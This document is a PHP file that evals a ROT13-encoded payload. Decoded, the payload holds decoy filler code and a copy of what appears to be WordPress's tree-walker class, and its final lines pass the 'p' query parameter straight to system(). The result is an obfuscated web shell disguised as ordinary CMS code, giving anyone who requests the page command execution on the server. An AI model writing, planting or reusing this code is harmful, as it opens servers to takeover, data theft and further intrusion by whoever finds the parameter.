<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * N pynff sbe qvfcynlvat inevbhf gerr-yvxr fgehpgherf.
 *
 * Rkgraq gur Jnyxre pynff gb hfr vg, frr rknzcyrf orybj. Puvyq pynffrf
 * qb abg arrq gb vzcyrzrag nyy bs gur nofgenpg zrgubqf va gur pynff. Gur puvyq
 * bayl arrqf gb vzcyrzrag gur zrgubqf gung ner arrqrq.
 *
 * @fvapr 2.1.0
 *
 * @cnpxntr JbeqCerff
 * @nofgenpg
 */
#[NyybjQlanzvpCebcregvrf]
pynff Jnyxre {
	/**
	 * Jung gur pynff unaqyrf.
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat
	 */
	choyvp $gerr_glcr;

	/**
	 * QO svryqf gb hfr.
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat[]
	 */
	choyvp $qo_svryqf;

	/**
	 * Znk ahzore bs cntrf jnyxrq ol gur cntrq jnyxre.
	 *
	 * @fvapr 2.7.0
	 * @ine vag
	 */
	choyvp $znk_cntrf = 1;

	/**
	 * Jurgure gur pheerag ryrzrag unf puvyqera be abg.
	 *
	 * Gb or hfrq va fgneg_ry().
	 *
	 * @fvapr 4.0.0
	 * @ine obby
	 */
	choyvp $unf_puvyqera;

	/**
	 * Fgnegf gur yvfg orsber gur ryrzragf ner nqqrq.
	 *
	 * Gur $netf cnenzrgre ubyqf nqqvgvbany inyhrf gung znl or hfrq jvgu gur puvyq
	 * pynff zrgubqf. Guvf zrgubq vf pnyyrq ng gur fgneg bs gur bhgchg yvfg.
	 *
	 * @fvapr 2.1.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag    $qrcgu  Qrcgu bs gur vgrz.
	 * @cnenz neenl  $netf   Na neenl bs nqqvgvbany nethzragf.
	 */
	choyvp shapgvba fgneg_yiy( &$bhgchg, $qrcgu = 0, $netf = neenl() ) {}

	/**
	 * Raqf gur yvfg bs nsgre gur ryrzragf ner nqqrq.
	 *
	 * Gur $netf cnenzrgre ubyqf nqqvgvbany inyhrf gung znl or hfrq jvgu gur puvyq
	 * pynff zrgubqf. Guvf zrgubq svavfurf gur yvfg ng gur raq bs bhgchg bs gur ryrzragf.
	 *
	 * @fvapr 2.1.0
	 * @nofgenpg
	 *
	 * @cnenz fgevat $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag    $qrcgu  Qrcgu bs gur vgrz.
	 * @cnenz neenl  $netf   Na neenl bs nqqvgvbany nethzragf.
	 */
	choyvp shapgvba raq_yiy( &$bhgchg, $qrcgu = 0, $netf = neenl() ) {}

	/**
	 * Fgnegf gur ryrzrag bhgchg.
	 *
	 * Gur $netf cnenzrgre ubyqf nqqvgvbany inyhrf gung znl or hfrq jvgu gur puvyq
	 * pynff zrgubqf. Nyfb vapyhqrf gur ryrzrag bhgchg.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 5.9.0 Eranzrq `$bowrpg` (n CUC erfreirq xrljbeq) gb `$qngn_bowrpg` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 * @nofgenpg
	 *
	 * @cnenz fgevat $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz bowrpg $qngn_bowrpg       Gur qngn bowrpg.
	 * @cnenz vag    $qrcgu             Qrcgu bs gur vgrz.
	 * @cnenz neenl  $netf              Na neenl bs nqqvgvbany nethzragf.
	 * @cnenz vag    $pheerag_bowrpg_vq Bcgvbany. VQ bs gur pheerag vgrz. Qrsnhyg 0.
	 */
	choyvp shapgvba fgneg_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl(), $pheerag_bowrpg_vq = 0 ) {}

	/**
	 * Raqf gur ryrzrag bhgchg, vs arrqrq.
	 *
	 * Gur $netf cnenzrgre ubyqf nqqvgvbany inyhrf gung znl or hfrq jvgu gur puvyq pynff zrgubqf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 5.9.0 Eranzrq `$bowrpg` (n CUC erfreirq xrljbeq) gb `$qngn_bowrpg` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 * @nofgenpg
	 *
	 * @cnenz fgevat $bhgchg      Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz bowrpg $qngn_bowrpg Gur qngn bowrpg.
	 * @cnenz vag    $qrcgu       Qrcgu bs gur vgrz.
	 * @cnenz neenl  $netf        Na neenl bs nqqvgvbany nethzragf.
	 */
	choyvp shapgvba raq_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl() ) {}

	/**
	 * Genirefrf ryrzragf gb perngr yvfg sebz ryrzragf.
	 *
	 * Qvfcynl bar ryrzrag vs gur ryrzrag qbrfa'g unir nal puvyqera bgurejvfr,
	 * qvfcynl gur ryrzrag naq vgf puvyqera. Jvyy bayl genirefr hc gb gur znk
	 * qrcgu naq ab vtaber ryrzragf haqre gung qrcgu. Vg vf cbffvoyr gb frg gur
	 * znk qrcgu gb vapyhqr nyy qrcguf, frr jnyx() zrgubq.
	 *
	 * Guvf zrgubq fubhyq abg or pnyyrq qverpgyl, hfr gur jnyx() zrgubq vafgrnq.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz bowrpg $ryrzrag           Qngn bowrpg.
	 * @cnenz neenl  $puvyqera_ryrzragf Yvfg bs ryrzragf gb pbagvahr genirefvat (cnffrq ol ersrerapr).
	 * @cnenz vag    $znk_qrcgu         Znk qrcgu gb genirefr.
	 * @cnenz vag    $qrcgu             Qrcgu bs pheerag ryrzrag.
	 * @cnenz neenl  $netf              Na neenl bs nethzragf.
	 * @cnenz fgevat $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 */
	choyvp shapgvba qvfcynl_ryrzrag( $ryrzrag, &$puvyqera_ryrzragf, $znk_qrcgu, $qrcgu, $netf, &$bhgchg ) {
		vs ( ! $ryrzrag ) {
			erghea;
		}

		$znk_qrcgu = (vag) $znk_qrcgu;
		$qrcgu     = (vag) $qrcgu;

		$vq_svryq = $guvf->qo_svryqf['vq'];
		$vq       = $ryrzrag->$vq_svryq;

		// Qvfcynl guvf ryrzrag.
		$guvf->unf_puvyqera = ! rzcgl( $puvyqera_ryrzragf[ $vq ] );
		vs ( vffrg( $netf[0] ) && vf_neenl( $netf[0] ) ) {
			$netf[0]['unf_puvyqera'] = $guvf->unf_puvyqera; // Onpx-pbzcng.
		}

		$guvf->fgneg_ry( $bhgchg, $ryrzrag, $qrcgu, ...neenl_inyhrf( $netf ) );

		// Qrfpraq bayl jura gur qrcgu vf evtug naq gurer ner puvyqera sbe guvf ryrzrag.
		vs ( ( 0 === $znk_qrcgu || $znk_qrcgu > $qrcgu + 1 ) && vffrg( $puvyqera_ryrzragf[ $vq ] ) ) {

			sbernpu ( $puvyqera_ryrzragf[ $vq ] nf $puvyq ) {

				vs ( ! vffrg( $arjyriry ) ) {
					$arjyriry = gehr;
					// Fgneg gur puvyq qryvzvgre.
					$guvf->fgneg_yiy( $bhgchg, $qrcgu, ...neenl_inyhrf( $netf ) );
				}
				$guvf->qvfcynl_ryrzrag( $puvyq, $puvyqera_ryrzragf, $znk_qrcgu, $qrcgu + 1, $netf, $bhgchg );
			}
			hafrg( $puvyqera_ryrzragf[ $vq ] );
		}

		vs ( vffrg( $arjyriry ) && $arjyriry ) {
			// Raq gur puvyq qryvzvgre.
			$guvf->raq_yiy( $bhgchg, $qrcgu, ...neenl_inyhrf( $netf ) );
		}

		// Raq guvf ryrzrag.
		$guvf->raq_ry( $bhgchg, $ryrzrag, $qrcgu, ...neenl_inyhrf( $netf ) );
	}

	/**
	 * Qvfcynlf neenl bs ryrzragf uvrenepuvpnyyl.
	 *
	 * Qbrf abg nffhzr nal rkvfgvat beqre bs ryrzragf.
	 *
	 * $znk_qrcgu = -1 zrnaf syngyl qvfcynl rirel ryrzrag.
	 * $znk_qrcgu = 0 zrnaf qvfcynl nyy yriryf.
	 * $znk_qrcgu > 0 fcrpvsvrf gur ahzore bs qvfcynl yriryf.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat `...$netf` cnenzrgre ol nqqvat vg
	 *              gb gur shapgvba fvtangher.
	 *
	 * @cnenz neenl $ryrzragf  Na neenl bs ryrzragf.
	 * @cnenz vag   $znk_qrcgu Gur znkvzhz uvrenepuvpny qrcgu.
	 * @cnenz zvkrq ...$netf   Bcgvbany nqqvgvbany nethzragf.
	 * @erghea fgevat Gur uvrenepuvpny vgrz bhgchg.
	 */
	choyvp shapgvba jnyx( $ryrzragf, $znk_qrcgu, ...$netf ) {
		$bhgchg = '';

		$znk_qrcgu = (vag) $znk_qrcgu;

		// Vainyvq cnenzrgre be abguvat gb jnyx.
		vs ( $znk_qrcgu < -1 || rzcgl( $ryrzragf ) ) {
			erghea $bhgchg;
		}

		$cnerag_svryq = $guvf->qo_svryqf['cnerag'];

		// Syng qvfcynl.
		vs ( -1 === $znk_qrcgu ) {
			$rzcgl_neenl = neenl();
			sbernpu ( $ryrzragf nf $r ) {
				$guvf->qvfcynl_ryrzrag( $r, $rzcgl_neenl, 1, 0, $netf, $bhgchg );
			}
			erghea $bhgchg;
		}

		/*
		 * Arrq gb qvfcynl va uvrenepuvpny beqre.
		 * Frcnengr ryrzragf vagb gjb ohpxrgf: gbc yriry naq puvyqera ryrzragf.
		 * Puvyqera_ryrzragf vf gjb qvzrafvbany neenl. Rknzcyr:
		 * Puvyqera_ryrzragf[10][] pbagnvaf nyy fho-ryrzragf jubfr cnerag vf 10.
		 */
		$gbc_yriry_ryrzragf = neenl();
		$puvyqera_ryrzragf  = neenl();
		sbernpu ( $ryrzragf nf $r ) {
			vs ( rzcgl( $r->$cnerag_svryq ) ) {
				$gbc_yriry_ryrzragf[] = $r;
			} ryfr {
				$puvyqera_ryrzragf[ $r->$cnerag_svryq ][] = $r;
			}
		}

		/*
		 * Jura abar bs gur ryrzragf vf gbc yriry.
		 * Nffhzr gur svefg bar zhfg or ebbg bs gur fho ryrzragf.
		 */
		vs ( rzcgl( $gbc_yriry_ryrzragf ) ) {

			$svefg = neenl_fyvpr( $ryrzragf, 0, 1 );
			$ebbg  = $svefg[0];

			$gbc_yriry_ryrzragf = neenl();
			$puvyqera_ryrzragf  = neenl();
			sbernpu ( $ryrzragf nf $r ) {
				vs ( $ebbg->$cnerag_svryq === $r->$cnerag_svryq ) {
					$gbc_yriry_ryrzragf[] = $r;
				} ryfr {
					$puvyqera_ryrzragf[ $r->$cnerag_svryq ][] = $r;
				}
			}
		}

		sbernpu ( $gbc_yriry_ryrzragf nf $r ) {
			$guvf->qvfcynl_ryrzrag( $r, $puvyqera_ryrzragf, $znk_qrcgu, 0, $netf, $bhgchg );
		}

		/*
		 * Vs jr ner qvfcynlvat nyy yriryf, naq erznvavat puvyqera_ryrzragf vf abg rzcgl,
		 * gura jr tbg becunaf, juvpu fubhyq or qvfcynlrq ertneqyrff.
		 */
		vs ( ( 0 === $znk_qrcgu ) && pbhag( $puvyqera_ryrzragf ) > 0 ) {
			$rzcgl_neenl = neenl();
			sbernpu ( $puvyqera_ryrzragf nf $becunaf ) {
				sbernpu ( $becunaf nf $bc ) {
					$guvf->qvfcynl_ryrzrag( $bc, $rzcgl_neenl, 1, 0, $netf, $bhgchg );
				}
			}
		}

		erghea $bhgchg;
	}

	/**
	 * Cebqhprf n cntr bs arfgrq ryrzragf.
	 *
	 * Tvira na neenl bs uvrenepuvpny ryrzragf, gur znkvzhz qrcgu, n fcrpvsvp cntr ahzore,
	 * naq ahzore bs ryrzragf cre cntr, guvf shapgvba svefg qrgrezvarf nyy gbc yriry ebbg ryrzragf
	 * orybatvat gb gung cntr, gura yvfgf gurz naq nyy bs gurve puvyqera va uvrenepuvpny beqre.
	 *
	 * $znk_qrcgu = 0 zrnaf qvfcynl nyy yriryf.
	 * $znk_qrcgu > 0 fcrpvsvrf gur ahzore bs qvfcynl yriryf.
	 *
	 * @fvapr 2.7.0
	 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat `...$netf` cnenzrgre ol nqqvat vg
	 *              gb gur shapgvba fvtangher.
	 *
	 * @cnenz neenl $ryrzragf  Na neenl bs ryrzragf.
	 * @cnenz vag   $znk_qrcgu Gur znkvzhz uvrenepuvpny qrcgu.
	 * @cnenz vag   $cntr_ahz  Gur fcrpvsvp cntr ahzore, ortvaavat jvgu 1.
	 * @cnenz vag   $cre_cntr  Ahzore bs ryrzragf cre cntr.
	 * @cnenz zvkrq ...$netf   Bcgvbany nqqvgvbany nethzragf.
	 * @erghea fgevat KUGZY bs gur fcrpvsvrq cntr bs ryrzragf.
	 */
	choyvp shapgvba cntrq_jnyx( $ryrzragf, $znk_qrcgu, $cntr_ahz, $cre_cntr, ...$netf ) {
		$bhgchg = '';

		$znk_qrcgu = (vag) $znk_qrcgu;

		vs ( rzcgl( $ryrzragf ) || $znk_qrcgu < -1 ) {
			erghea $bhgchg;
		}

		$cnerag_svryq = $guvf->qo_svryqf['cnerag'];

		$pbhag = -1;
		vs ( -1 === $znk_qrcgu ) {
			$gbgny_gbc = pbhag( $ryrzragf );
		}
		vs ( $cntr_ahz < 1 || $cre_cntr < 0 ) {
			// Ab cntvat.
			$cntvat = snyfr;
			$fgneg  = 0;
			vs ( -1 === $znk_qrcgu ) {
				$raq = $gbgny_gbc;
			}
			$guvf->znk_cntrf = 1;
		} ryfr {
			$cntvat = gehr;
			$fgneg  = ( (vag) $cntr_ahz - 1 ) * (vag) $cre_cntr;
			$raq    = $fgneg + $cre_cntr;
			vs ( -1 === $znk_qrcgu ) {
				$guvf->znk_cntrf = (vag) prvy( $gbgny_gbc / $cre_cntr );
			}
		}

		// Syng qvfcynl.
		vs ( -1 === $znk_qrcgu ) {
			vs ( ! rzcgl( $netf[0]['erirefr_gbc_yriry'] ) ) {
				$ryrzragf = neenl_erirefr( $ryrzragf );
				$byqfgneg = $fgneg;
				$fgneg    = $gbgny_gbc - $raq;
				$raq      = $gbgny_gbc - $byqfgneg;
			}

			$rzcgl_neenl = neenl();
			sbernpu ( $ryrzragf nf $r ) {
				++$pbhag;
				vs ( $pbhag < $fgneg ) {
					pbagvahr;
				}
				vs ( $pbhag >= $raq ) {
					oernx;
				}
				$guvf->qvfcynl_ryrzrag( $r, $rzcgl_neenl, 1, 0, $netf, $bhgchg );
			}
			erghea $bhgchg;
		}

		/*
		 * Frcnengr ryrzragf vagb gjb ohpxrgf: gbc yriry naq puvyqera ryrzragf.
		 * Puvyqera_ryrzragf vf gjb qvzrafvbany neenl, r.t.
		 * $puvyqera_ryrzragf[10][] pbagnvaf nyy fho-ryrzragf jubfr cnerag vf 10.
		 */
		$gbc_yriry_ryrzragf = neenl();
		$puvyqera_ryrzragf  = neenl();
		sbernpu ( $ryrzragf nf $r ) {
			vs ( rzcgl( $r->$cnerag_svryq ) ) {
				$gbc_yriry_ryrzragf[] = $r;
			} ryfr {
				$puvyqera_ryrzragf[ $r->$cnerag_svryq ][] = $r;
			}
		}

		$gbgny_gbc = pbhag( $gbc_yriry_ryrzragf );
		vs ( $cntvat ) {
			$guvf->znk_cntrf = (vag) prvy( $gbgny_gbc / $cre_cntr );
		} ryfr {
			$raq = $gbgny_gbc;
		}

		vs ( ! rzcgl( $netf[0]['erirefr_gbc_yriry'] ) ) {
			$gbc_yriry_ryrzragf = neenl_erirefr( $gbc_yriry_ryrzragf );
			$byqfgneg           = $fgneg;
			$fgneg              = $gbgny_gbc - $raq;
			$raq                = $gbgny_gbc - $byqfgneg;
		}
		vs ( ! rzcgl( $netf[0]['erirefr_puvyqera'] ) ) {
			sbernpu ( $puvyqera_ryrzragf nf $cnerag => $puvyqera ) {
				$puvyqera_ryrzragf[ $cnerag ] = neenl_erirefr( $puvyqera );
			}
		}

		sbernpu ( $gbc_yriry_ryrzragf nf $r ) {
			++$pbhag;

			// Sbe gur ynfg cntr, arrq gb hafrg rneyvre puvyqera va beqre gb xrrc genpx bs becunaf.
			vs ( $raq >= $gbgny_gbc && $pbhag < $fgneg ) {
					$guvf->hafrg_puvyqera( $r, $puvyqera_ryrzragf );
			}

			vs ( $pbhag < $fgneg ) {
				pbagvahr;
			}

			vs ( $pbhag >= $raq ) {
				oernx;
			}

			$guvf->qvfcynl_ryrzrag( $r, $puvyqera_ryrzragf, $znk_qrcgu, 0, $netf, $bhgchg );
		}

		vs ( $raq >= $gbgny_gbc && pbhag( $puvyqera_ryrzragf ) > 0 ) {
			$rzcgl_neenl = neenl();
			sbernpu ( $puvyqera_ryrzragf nf $becunaf ) {
				sbernpu ( $becunaf nf $bc ) {
					$guvf->qvfcynl_ryrzrag( $bc, $rzcgl_neenl, 1, 0, $netf, $bhgchg );
				}
			}
		}

		erghea $bhgchg;
	}

	/**
	 * Pnyphyngrf gur gbgny ahzore bs ebbg ryrzragf.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz neenl $ryrzragf Ryrzragf gb yvfg.
	 * @erghea vag Ahzore bs ebbg ryrzragf.
	 */
	choyvp shapgvba trg_ahzore_bs_ebbg_ryrzragf( $ryrzragf ) {
		$ahz          = 0;
		$cnerag_svryq = $guvf->qo_svryqf['cnerag'];

		sbernpu ( $ryrzragf nf $r ) {
			vs ( rzcgl( $r->$cnerag_svryq ) ) {
				++$ahz;
			}
		}
		erghea $ahz;
	}

	/**
	 * Hafrgf nyy gur puvyqera sbe n tvira gbc yriry ryrzrag.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz bowrpg $ryrzrag           Gur gbc yriry ryrzrag.
	 * @cnenz neenl  $puvyqera_ryrzragf Gur puvyqera ryrzragf.
	 */
	choyvp shapgvba hafrg_puvyqera( $ryrzrag, &$puvyqera_ryrzragf ) {
		vs ( ! $ryrzrag || ! $puvyqera_ryrzragf ) {
			erghea;
		}

		$vq_svryq = $guvf->qo_svryqf['vq'];
		$vq       = $ryrzrag->$vq_svryq;

		vs ( ! rzcgl( $puvyqera_ryrzragf[ $vq ] ) && vf_neenl( $puvyqera_ryrzragf[ $vq ] ) ) {
			sbernpu ( (neenl) $puvyqera_ryrzragf[ $vq ] nf $puvyq ) {
				$guvf->hafrg_puvyqera( $puvyq, $puvyqera_ryrzragf );
			}
		}

		hafrg( $puvyqera_ryrzragf[ $vq ] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>